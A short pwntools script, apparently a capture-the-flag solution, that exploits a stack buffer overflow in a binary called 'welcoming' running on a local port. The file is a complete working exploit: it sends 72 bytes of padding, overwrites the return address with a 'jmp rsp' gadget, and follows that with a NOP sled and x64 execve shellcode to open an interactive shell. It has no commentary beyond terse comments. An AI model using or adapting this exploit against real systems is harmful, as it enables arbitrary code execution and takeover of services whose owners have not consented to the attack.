from pwn import *

#p = process("./welcoming")
p = remote("127.0.0.1", "6000")


shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" # exec(/bin/bash) x64



payload = b"A"*72
payload += p64(0x401175) # 0x401175 : jmp rsp  - Obtained from: $ ROPgadget --binary ./welcoming | grep rsp
payload += b"\x90" * 20 + shellcode


p.recv()
p.sendline(payload)
p.interactive()
